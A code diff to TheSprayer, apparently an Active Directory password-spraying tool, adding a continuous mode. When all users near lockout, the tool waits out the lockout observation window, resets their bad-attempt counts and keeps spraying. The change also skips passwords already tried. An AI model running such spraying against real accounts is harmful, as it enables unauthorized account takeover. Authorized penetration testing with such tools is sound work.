@@ -7,6 +7,7 @@ using TheSprayer.Extensions;
 using System.Linq;
 using TheSprayer.Helpers;
 using System.Threading.Tasks;
+using System.Threading;
 
 namespace TheSprayer.Services
 {
@@ -252,7 +253,7 @@ namespace TheSprayer.Services
             }
             else
             {
-                Console.WriteLine("Filtering disabled, nearly locked and users that have already had this password sprayed...");
+                Console.WriteLine("Filtering disabled and nearly locked users...");
                 foreach (var user in users)
                 {
                     if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
@@ -273,8 +274,24 @@ namespace TheSprayer.Services
                 //If we have no more users, don't continue
                 if (filteredUsers.Count == 0)
                 {
-                    Console.WriteLine($"{users.Count} users found but they are all at risk of lockout, exiting.");
-                    return;
+                    Console.Write($"{users.Count} users found but they are all at risk of lockout, ");
+                    if (!continuous)
+                    {
+                        Console.WriteLine("exiting.");
+                        return;
+                    }
+                    else
+                    {
+                        Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
+                        Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5))); //Rounded up to prevent trying a minute early, just in case
+
+                        //Reset the password attempts since we know it's 0 for everyone on the default policy now (excluding user error, but I'm sure it's fine)
+                        foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
+                        {
+                            user.BadPasswordAttempts = 0;
+                            filteredUsers.Add(user);
+                        }
+                    }
                 }
 
                 //Try the current password
@@ -288,11 +305,14 @@ namespace TheSprayer.Services
                         if (previousSprays.ContainsKey(user.SamAccountName))
                         {
                             var previousAttempt = previousSprays[user.SamAccountName].FirstOrDefault(a => a.Password == password);
-                            if (previousAttempt != null && previousAttempt.Success) 
+                            if (previousAttempt != null) 
                             {
-                                ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
+                                if (previousAttempt.Success)
+                                {
+                                    ColorConsole.WriteLine($"{user.SamAccountName}:{password} (Found in database)");
+                                }
+                                return;
                             }
-                            return;
                         }
 
                         //Test the credentials
